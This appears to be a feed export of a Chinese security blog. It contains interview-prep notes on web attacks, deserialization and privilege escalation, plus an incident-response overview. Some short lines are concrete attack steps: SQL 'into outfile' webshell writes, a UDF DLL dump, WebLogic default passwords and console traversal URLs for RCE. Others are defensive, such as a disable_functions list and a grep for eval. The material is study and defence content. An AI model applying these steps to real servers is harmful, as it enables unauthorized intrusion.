Server中的一个组件，可以用来执行系统命令,在拿到sa口令之后，经常可以通过xp_cmdshell来进行提权<br>前提：<br>getshell或者存在sql注入并且能够执行命令。<br>sql server是system权限，sql server默认就是system权限<br><strong>sp_oacreate提权</strong><br>在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权<br>前提：<br>需要同时具备sp_oacreate和sp_oamethod两个功能组件</p><h5 id="GPC是什么？GPC之后怎么绕过？"><a href="#GPC是什么？GPC之后怎么绕过？" class="headerlink" title="GPC是什么？GPC之后怎么绕过？"></a>GPC是什么？GPC之后怎么绕过？</h5><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染</p><h5 id="如何防范webshell"><a href="#如何防范webshell" class="headerlink" title="如何防范webshell?"></a>如何防范webshell?</h5><p>防范的措施大概有三种:</p><ul><li>将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。</li><li>匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。</li><li>将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</li><li>干脆只能局域网访问，做个隔离谁都看不到</li></ul><h5 id="webshell检查思路？"><a href="#webshell检查思路？" class="headerlink" title="webshell检查思路？"></a>webshell检查思路？</h5><p>首先，通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在<strong>应用层进行检测</strong>。<br>黑客不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是<strong>静态特征检测</strong>。<br>webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是<strong>动态特征检测</strong>。</p><p>【静态检测】<br>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法。<br>优点是快速方便，对已知的webshell查找准确率高，部署方便。<br>缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p><p>【静态检测配合人工】<br>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>【动态检测】<br>Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。<br>如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。<br>Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。<br>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p><p>【日志检测】<br>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页<br>面的访问数据和数据提交记录。<br>日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测</p><p>【寻找webshell】<br>1.自动化查找：D盾 河马 fotify<br>2.手动查找：windows sublime 全文件夹查找 IDE PHPSTORM 全局查找<br>Linux 命令查找 <code>grep -rn &quot;eval(&quot; *</code><br>webshell特征 PHP的危险函数<br>还有<code>phar &lt;?php XXXXX</code></p><h5 id="见过哪些登录页面的漏洞？"><a href="#见过哪些登录页面的漏洞？" class="headerlink" title="见过哪些登录页面的漏洞？"></a>见过哪些登录页面的漏洞？</h5><p>注入点以及万能密码（分jsp，php等页面的万能密码）<br>敏感信息泄露（未授权，文件路径）<br>越权漏洞（多是框架编写问题）<br>验证码绕过<br>无限注册帐号<br>任意密码重置<br>明文传输</p><h5 id="如何快速判定XSS类型？"><a href="#如何快速判定XSS类型？" class="headerlink" title="如何快速判定XSS类型？"></a>如何快速判定XSS类型？</h5><p>存储型XSS：<br>你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；<br>反射型XSS：<br>你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；<br>DOM型XSS：<br>你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；<br>CSP策略：浏览器内容安全策略，减少xss攻击。</p><h5 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h5><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li></ul><h5 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h5><ol><li>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。</li></ol><p><strong>修复方式</strong>：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。<br>2. CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。<br><strong>修复方式</strong>：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.<br>3. XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。<br><strong>修复方式</strong>：XML解析库在调用时严格禁止对外部实体的解析。</p><h5 id="mysql的网站，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站，5.0以上和5.0以下有什么区别？"></a>mysql的网站，5.0以上和5.0以下有什么区别？</h5><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操作</p><h5 id="关于MySQL写shell的问题"><a href="#关于MySQL写shell的问题" class="headerlink" title="关于MySQL写shell的问题"></a>关于MySQL写shell的问题</h5><p><del>妈了个逼的怎么这么喜欢问这方面的东西</del><br>1.写shell用什么函数？</p><ul><li><code>select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39;</code></li><li><code>dumpfile</code></li><li><code>file_put_contents</code></li></ul><p>2.outfile不能用了怎么办？<br><code>select unhex(&#39;udf.dll hex code&#39;) intodumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;</code>这样子可以UDF提权</p><p>3.dumpfile和outfile有什么不一样？<br>outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p><p>4.sleep()能不能写shell？<br>SLEEP()函数本身并不能获取shell，但是可以联动其它漏洞获取shell</p><p>5.写shell的条件？</p><ul><li>用户权限</li><li>目录读写权限</li><li>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞<br>其中<code>open_basedir</code>: 将用户可操作的文件限制在某目录下</li></ul><p>6.mysql写shell的条件？</p><ul><li>网站可访问路径的绝对路径</li><li>secure_file_priv 的值非NULL或包含了导出的绝对路径</li><li>mysql服务有对网站可访问路径的写权限</li><li>mysql连接用户有FILE权限/ROOT用户或ROOT权限</li><li>GPC关闭//未对闭合用的引号转义<br>secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>Mysql&gt;=5.5.53 默认为NULL，即默认禁止导入导出<br>Mysql&lt;5.5.53 默认为空，即默认无限制<br>outfile 和 dumpfile的路径不支持hex，必须有引号包裹</li></ul><p>7.mysql日志写shell的条件？<br>与导出函数写Shell相比，规避了 secure_file_priv 的限制</p><ol><li>网站可访问路径的绝对路径</li><li>mysql服务有对网站可访问路径的写权限</li><li>mysql连接用户有权限开启日志记录和更换日志路径/ROOT权限</li><li>GPC关闭/未对闭合用的引号转义<br>虽然日志路径可以hex编码，但被记入日志的查询语句中的shell内容需要引号包裹，加<code>\</code>后传到数据库执行会报错，无法记录进日志</li></ol><p>8.disable_functions 怎么绕过？</p><ol><li>黑名单总有漏网之鱼，多尝试一些函数</li><li>LD_PRELOAD：原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作</li><li>lmageMagick：利用lmageMagick命令执行漏洞（CVE-2016-3714）</li><li>Windows系统组件COM绕过</li><li>PHP7.4 FFI绕过</li><li>利用Bash破壳（CVE-2014-6271）漏洞绕过</li><li>利用imap_open()绕过（CVE-2018-19518）</li><li>利用pcntl插件绕过</li></ol><p>9.Mysql有几种提权方式？<br>【Mysql_UDF 提权】<br>利用了root高权限，创建带有调用 cmd 的函数的 udf.dll 动态链接库<br>导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd<br>限制条件：</p><ol><li>MySQL 数据库没有开启安全模式（确认secure_file_priv=’’是否为空）</li><li>已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</li><li>shell有写入到数据库安装目录的权限。<br>【MOF提权】<br>基本上在Windows Server 2003的环境下才可以成功。<br>原理是C:/Windows/system32/wbem/mof/目录下的mof文件每隔几秒钟左右都会被系统执行，因为这个 MOF 里面有一部分是 VBS脚本，所以可以利用这个VBS脚本来调用CMD来执行系统命令，如果 MySQL有权限操作 mof 目录的话，就可以来执行任意命令了。<br>【反弹端口连接提权】<br>需要一个root弱密码，并且可以外连</li></ol><p>10.报错注入的函数有哪些？</p><pre><code>updatexml、extractvalue、floor、exp</code></pre><h5 id="拿到webshell不出网情况下怎么办？"><a href="#拿到webshell不出网情况下怎么办？" class="headerlink" title="拿到webshell不出网情况下怎么办？"></a>拿到webshell不出网情况下怎么办？</h5><p>reg上传去正向连接。或探测出网协议，如dns，icmp</p><h5 id="知不知道脏牛提权漏洞？"><a href="#知不知道脏牛提权漏洞？" class="headerlink" title="知不知道脏牛提权漏洞？"></a>知不知道脏牛提权漏洞？</h5><p>Linux内核 &gt;= 2.6.22的内存子系统在处理写入复制时产生了竞争条件（race condition）。<br>恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。<br>利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限</p><h5 id="sqlmap的–level和–risk的区别？"><a href="#sqlmap的–level和–risk的区别？" class="headerlink" title="sqlmap的–level和–risk的区别？"></a>sqlmap的–level和–risk的区别？</h5><p>level级别越高发送的请求越多，并且在level3以上时会尝试对referer注入。<br>而risk则是风险系数，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的QL注入测试。</p><h5 id="MYSQL-数据库的站，只有一个-80-端口开放？"><a href="#MYSQL-数据库的站，只有一个-80-端口开放？" class="headerlink" title="MYSQL 数据库的站，只有一个 80 端口开放？"></a>MYSQL 数据库的站，只有一个 80 端口开放？</h5><p>做了站库分离；更改了端口使3306端口不对外开放。</p><h5 id="3389-无法连接是什么情况？"><a href="#3389-无法连接是什么情况？" class="headerlink" title="3389 无法连接是什么情况？"></a>3389 无法连接是什么情况？</h5><ul><li>没开放 3389 端口</li><li>端口被修改</li><li>防护拦截</li><li>处于内网(需进行端口转发)</li></ul><h5 id="上传图片可以正常访问，上传脚本格式访问则403怎么办？"><a href="#上传图片可以正常访问，上传脚本格式访问则403怎么办？" class="headerlink" title="上传图片可以正常访问，上传脚本格式访问则403怎么办？"></a>上传图片可以正常访问，上传脚本格式访问则403怎么办？</h5><p>有可能Web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。</p><h5 id="token和refer横向对比-谁安全等级高？"><a href="#token和refer横向对比-谁安全等级高？" class="headerlink" title="token和refer横向对比 谁安全等级高？"></a>token和refer横向对比 谁安全等级高？</h5><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS 跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。<br>但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p><h5 id="代码执行、文件读取、命令执行函数有哪些？"><a href="#代码执行、文件读取、命令执行函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行函数有哪些？"></a>代码执行、文件读取、命令执行函数有哪些？</h5><pre><code>建议熟背一下！1）代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function2）文件读取：file_get_contents(),highlight_file(),fopen(),readfile(),fread(),fgetss(),fgets(),parse_ini_file(),show_source(),file()等3)命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(),popen(),proc_open()</code></pre><h5 id="为什么aspx木马权限比asp大？"><a href="#为什么aspx木马权限比asp大？" class="headerlink" title="为什么aspx木马权限比asp大？"></a>为什么aspx木马权限比asp大？</h5><p>aspx使用的是.net技术。IIS中默认不支持，ASP只是脚本语言而已。<br>入侵的时候asp的木马一般是guest权限而APSX的木马一般是users权限。</p><h5 id="提权为何选择可读写目录？不用带空格的目录？"><a href="#提权为何选择可读写目录？不用带空格的目录？" class="headerlink" title="提权为何选择可读写目录？不用带空格的目录？"></a>提权为何选择可读写目录？不用带空格的目录？</h5><p>因为exp执行多半需要空格界定参数</p><h5 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……"></a>持续更新中……</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;拿到目标站以后的渗透思路？&quot;&gt;&lt;a href=&quot;#拿到目标站以后的渗透思路？&quot; class=&quot;headerlink&quot; title=&quot;拿到目标站以后的渗透思路？&quot;&gt;&lt;/a&gt;拿到目标站以后的渗透思路？&lt;/h5&gt;&lt;p&gt;渗透测试流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;项目前期准</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>护网面试总结</title>
    <link href="https://liu1272.github.io/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/07/31/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-07-31T08:40:00.000Z</published>
    <updated>2023-07-31T17:55:42.493Z</updated>
    
    <content type="html"><![CDATA[<h5 id="首先看简历"><a href="#首先看简历" class="headerlink" title="首先看简历"></a>首先看简历</h5><p>简历不要乱吹，会什么就写什么；<br>只要你写在简历上的面试官都会着重问。</p><h5 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h5><p>基本上第一句是先让你做个自我介绍<br>你说的东西后面一定会问下去，所以建议说点项目或者设备的东西，先不要这么快上强度。</p><h5 id="判断恶意外连-分析威胁情报"><a href="#判断恶意外连-分析威胁情报" class="headerlink" title="判断恶意外连/分析威胁情报"></a>判断恶意外连/分析威胁情报</h5><ol><li>首先外连是从内到外</li><li>查看外连使用的协议</li><li>查看ip，看流量，看告警分析，看返回包、状态码</li></ol><h5 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h5><p><strong>Log4j</strong><br>Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。<br>该漏洞主要是由于日志在打印时当遇到<code>$&#123;</code>后，以<code>:</code>号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</p><p>核心原理为，通过Lookup接口+LADP，从服务器请求下载了存在恶意payload的class文件，由于日志检测时，存在${则触发替换机制，导致了表达式被替换成了lookup查找到的恶意payload，在请求过程中被实例化解析执行了。</p><p>日志在打印时当遇到<code>$&#123;</code>后，Interpolator类以<code>:</code>号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过prefix去找对应的 lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行。</p><p>JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。</p><p><strong>Shiro</strong><br>shiro提供记住密码功能<br>Payload产生的过程：命令=》序列化=》AES加密=》base64编码=》RememberMe Cookie值<br>利用：用生成的Payload，构造数据包，伪造cookie发送payload<br>【SHIRO-550】<br>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：<br>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化<br>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞<br>【SHIRO-721】<br>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的<br>RememberMe cookie即可完成攻击<br>【两者区别】<br>shiro550使用可以使用已知密钥碰撞，但是shiro721由系统随机生成<br>550先验证”rememberMe” Cookie的值，再进行身份验证，因此可以绕过身份认证达成未授权访问<br>721登录时先进行身份验证，再验证”rememberMe” Cookie的值，所以需要一个可用的会话来利用<br>最后：shiro登录流程可以自定义</p><p><strong>weblogic</strong><br>weblogic就是把java应用程序运行起来，并提供服务的一种程序。</p><ol><li>weblogic控制台的7001端口，默认会开启T3协议服务，T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</li><li>weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</li></ol><p><strong>fastjson</strong><br>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断<br>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数<br>【无回显怎么办】</p><ol><li>一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</li><li>通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</li><li>直接将命令执行结果回显到请求Poc的HTTP响应中</li></ol><p><strong>Jboss</strong><br>Jboss是一个管理EJB的容器和服务器。<br>下面是三个JBoss反序列化漏洞：<br>漏洞存在/jbossmq-httpil/HTTPServerILServlet中<br>漏洞存在/invoker/readonly中<br>漏洞存在/invoker/JMXInvokerServlet中<br>程序获取http请求数据保存到httpRequest中，进一步处理后保存到变量ois中，然后程序没有对该数据进行过滤，直接使用readObject()方法进行反序列化。</p><p><strong>Python</strong><br>Python内置了很多序列化/反序列化的方式，最常用的有json、pickle、marshal这三种。<br>json较为安全，因为它序列化后的字符串长度最小。<br>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。<strong>reduce</strong>()类似与PHP中的wakeup，在反序列化的时候会自动调用。<br>防御：<br>1、用更高级的接口__getnewargs()、getstate()、setstate()等代替reduce()魔术方法；<br>2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</p><p><strong>PHP</strong><br>以前的文章已经做出说明，不再重复叙述。</p><h5 id="有哪些常见的框架-中间件漏洞"><a href="#有哪些常见的框架-中间件漏洞" class="headerlink" title="有哪些常见的框架/中间件漏洞"></a>有哪些常见的框架/中间件漏洞</h5><p><strong>Python_Django</strong><br>目录遍历漏洞、重置密码漏洞、SQL注入漏洞、任意代码执行</p><p><strong>Python_Flask</strong><br>SSTI模板注入漏洞（后面再学习）</p><p><strong>Python_Web2py</strong><br>本地文件包含漏洞、输入验证漏洞</p><p><strong>Python_Tornado</strong><br>Tornado是非阻塞式服务器，而且速度相当快<br>文件读取漏洞：os.path.abspath函数获得的路径，是没有结尾处的”/“的，因此可以自己构造路径<br>模板注入漏洞：同样后面再学习</p><p><strong>Python_Scrapy</strong><br>scrapyd未授权访问漏洞:6800端口可以部署恶意的scrapy包到云服务，进而获取服务器权限<br>Scrapy反序例化漏洞</p><p><strong>struts2</strong><br>struts是java的web框架<br>在注册或登录页面，提交失败后一般会默认返回之前提交的数据<br>由于后端使用<code>%&#123;value&#125;</code>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。<br>……</p><p><strong>weblogic</strong><br>weblogic是java的web框架<br>弱口令漏洞：</p><pre><code>用户名：weblogic、system、admin、WebLogic密码：weblogic、weblogic123、password、security、system、admin、WebLogic然后在上传处上传一个jsp类型的小马的war包来拿到shell</code></pre><p>任意文件读取漏洞：</p><pre><code>http://ip:7001/hello/file.jsp?path=  #接文件路径Weblogic 后台的密文与密钥这两个文件分别为 config.xml 和 SerializedSystemIni.dat</code></pre><p>未授权远程命令执行漏洞：</p><pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal或http://ip:7001/console/images/%252e%252e%252fconsole.portal或者构造一个反弹shell XML 文件，通过访问这个文件来执行命令</code></pre><h5 id="远程代码执行漏洞分类"><a href="#远程代码执行漏洞分类" class="headerlink" title="远程代码执行漏洞分类"></a>远程代码执行漏洞分类</h5><ol><li>直接调用系统函数例如exec</li><li>把序列化的包反序列化的时候调用不当出现了rce</li></ol><h5 id="常见反序列化的流量特征"><a href="#常见反序列化的流量特征" class="headerlink" title="常见反序列化的流量特征"></a>常见反序列化的流量特征</h5><p>shiro就看cookie中rememberMe字段，什么都要从这里传<br>fastjson：可以在提交的包中找找json格式的数据，重点看一下有无rmi或者出网的一些行为，（在十六进制中会呈现ACED开头，这段不确定）<br>st2-045：请求头中的Content-Type字段</p><h5 id="问漏洞题不会回答怎么办"><a href="#问漏洞题不会回答怎么办" class="headerlink" title="问漏洞题不会回答怎么办"></a>问漏洞题不会回答怎么办</h5><ol><li>先讲漏洞原理</li><li>漏洞特征，流量，返回码</li><li>结合设备特性讲</li></ol><h5 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h5><p><strong>报错注入</strong></p><pre><code>updatexml()         是mysql对xml文档数据进行查询和修改的xpath函数extractvalue()      是mysql对xml文档数据进行查询的xpath函数floor()             mysql中用来取整的函数exp()               此函数返回e(自然对数的底)指数X的幂值</code></pre><p><strong>时间盲注</strong></p><pre><code>sleep()             直接延迟时间benchmark()         通过计算md5消耗时间</code></pre><p><strong>堆叠植入</strong></p><pre><code>mysqli_multi_query()    可以使用;堆叠多条语句</code></pre><p><strong>宽字节注入</strong></p><pre><code>使用PHP连接Mysql的时候，当设置&quot;character_set_client=gbk&quot;时会导致一个编码转换的问题mysql在使用GBK编码的时候，会认为两个字符是一个汉字GBK就是常说的宽字节之一，实际上只有两个字节前一个ASCII码要大于128,才到汉字的范围</code></pre><p><strong>防护方案</strong></p><ol><li>预编译</li><li>限制长度</li><li>加WAF</li><li>通信加密<br>其中预编译：<br>因为sql注入是因为动态字符串的拼接导致sql命令发生改变，然后编译并且执行错误的结果。<br>而sql预处理则是提前“告诉”sql语法处理器，提前声明并且编译特定格式的sql语句，然后将所有用户的输入视为纯字符串参数，最后组成查询语句。</li></ol><p><strong>sql注入的进一步利用</strong></p><ol><li>拖库</li><li>在有绝对路径和into outfile函数时写shell到web目录下</li><li>服务器超管，获取服务器管理员权限</li><li>mssql2005之前在SQLsever利用xp_cmdshell提权</li><li>UDF提权是用户自定义函数，写一个恶意的dll到系统system32目录下（定义一个可以执行系统命令的函数）</li></ol><h5 id="常见的解析漏洞有哪些"><a href="#常见的解析漏洞有哪些" class="headerlink" title="常见的解析漏洞有哪些"></a>常见的解析漏洞有哪些</h5><ul><li>IIS 6.0   /xx.asp/xx.jpg “xx.asp”是文件夹名</li><li>IIS 7.0   /7.5默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</li><li>Nginx 版本小于等于 0.8.37，利用方法和IIS7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg.php</li><li>Apache上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</li><li>lighttpd xx.jpg/xx.php，</li></ul><h5 id="ISS服务器要做哪些方面保护措施"><a href="#ISS服务器要做哪些方面保护措施" class="headerlink" title="ISS服务器要做哪些方面保护措施"></a>ISS服务器要做哪些方面保护措施</h5><ol><li>保持 Windows 升级:</li><li>使用 IIS 防范工具</li><li>移除缺省的 Web 站点</li><li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们</li><li>有规则地检查你的管理员组和服务:</li><li>严格控制服务器的写访问权限</li><li>设置复杂的密码</li><li>减少/排除 Web 服务器上的共享</li><li>禁用 TCP/IP 协议中的 NetBIOS:</li><li>使用 TCP 端口阻塞</li><li>仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat</li><li>管理 IIS 目录安全:</li><li>使用 NTFS 安全:</li><li>管理用户账户</li><li>审计你的 Web 服务器</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;首先看简历&quot;&gt;&lt;a href=&quot;#首先看简历&quot; class=&quot;headerlink&quot; title=&quot;首先看简历&quot;&gt;&lt;/a&gt;首先看简历&lt;/h5&gt;&lt;p&gt;简历不要乱吹，会什么就写什么；&lt;br&gt;只要你写在简历上的面试官都会着重问。&lt;/p&gt;
&lt;h5 id=&quot;第一个问题&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>应急响应概述</title>
    <link href="https://liu1272.github.io/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/"/>
    <id>https://liu1272.github.io/2023/07/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E8%BF%B0/</id>
    <published>2023-07-14T13:24:00.000Z</published>
    <updated>2023-08-06T12:35:11.745Z</updated>
    
    <content type="html"><![CDATA[<h3 id="应急响应概述"><a href="#应急响应概述" class="headerlink" title="应急响应概述"></a>应急响应概述</h3><h4 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h4><p>事件判断:判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS等等。<br>临时处置:给出客户临时处置建议，断网隔离，保护现场环境。<br>信息收集分析:收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析、样本分析。<br>清理处置:直接杀掉进程，删除文件，打补丁，抑或是修复文件。<br>产出报告:整理并输出完整的安全事件报告。</p><h4 id="常受攻击Web漏洞"><a href="#常受攻击Web漏洞" class="headerlink" title="常受攻击Web漏洞"></a>常受攻击Web漏洞</h4><table><thead><tr><th>攻击平台</th><th>漏洞编号</th></tr></thead><tbody><tr><td>Weblogic</td><td>CVE-2017-3248/CVE-2017-10271/CVE-2018-2628/CVE-2018-2894</td></tr><tr><td>Drupal</td><td>CVE-2018-7600/CVE-2018-7602</td></tr><tr><td>Struts2</td><td>CVE-2017-5638/CVE-2017-9805/CVE-2018-11776</td></tr><tr><td>ThinkPHP</td><td>ThinkPHPv5 GetShell</td></tr><tr><td>Windows Server</td><td>弱口令爆破/CVE-2017-0143</td></tr><tr><td>PHPStudy</td><td>弱口令爆破</td></tr><tr><td>PHPMyAdmin</td><td>弱口令爆破</td></tr><tr><td>MySQL</td><td>弱口令爆破</td></tr><tr><td>Tomcat</td><td>弱口令爆破/CVE-2017-12615</td></tr><tr><td>Spring Data Commons</td><td>CVE-2018-1273</td></tr><tr><td>Jekins</td><td>CVE-2019-1003000</td></tr><tr><td>JBoss</td><td>CVE-2010-0738/CVE-2017-12149</td></tr></tbody></table><h4 id="常受攻击组件漏洞"><a href="#常受攻击组件漏洞" class="headerlink" title="常受攻击组件漏洞"></a>常受攻击组件漏洞</h4><table><thead><tr><th>应用</th><th>漏洞名</th></tr></thead><tbody><tr><td>Docker</td><td>Docker未授权漏洞</td></tr><tr><td>Nexus Repository</td><td>Nexus Repository Manager 3远程代码执行漏洞</td></tr><tr><td>ElasticSearch</td><td>ElasticSearch未授权漏洞</td></tr><tr><td>Hadoop Yarn</td><td>Hadoop Yarn REST API未授权漏洞</td></tr><tr><td>Kubernetes</td><td>Kubernetes Api Server 未授权漏洞</td></tr><tr><td>Jenkins</td><td>Jenkins RCE(CVE-2019-1003000)</td></tr><tr><td>Spark</td><td>Spark REST API未授权漏洞</td></tr></tbody></table><h4 id="处置思路"><a href="#处置思路" class="headerlink" title="处置思路"></a>处置思路</h4><ol><li>找到webshell</li><li>确定攻击者IP（合理猜测）</li><li>回溯攻击者操作</li><li>梳理整个攻击过程（据实分析，积极沟通）</li></ol><h4 id="应急前沟通"><a href="#应急前沟通" class="headerlink" title="应急前沟通"></a>应急前沟通</h4><ul><li>现场现象是什么?如何发现的?(依据是什么) ?</li><li>什么时候发现的?</li><li>目前是否有做物理隔离(断网) ?</li><li>受害机器是哪个?</li><li>受害服务有几台?(1台/N台)</li><li>最先发现是哪台 ?</li><li>这台服务器对外有哪些服务?</li><li>这台服务器于其他机器是否处于同一个内网?</li><li>操作系统类型? </li><li>是否有公网映射业务? </li><li>远程管理方式? </li><li>网络边界有没有流量监控设备? </li><li>主机侧是否有EDR等安全设备</li></ul><h4 id="响应事件——Web攻击"><a href="#响应事件——Web攻击" class="headerlink" title="响应事件——Web攻击"></a>响应事件——Web攻击</h4><p><strong>相关表现:</strong> 页面被篡改、恶意推广、黑词黑页、webshell<br><strong>相关危害:</strong> 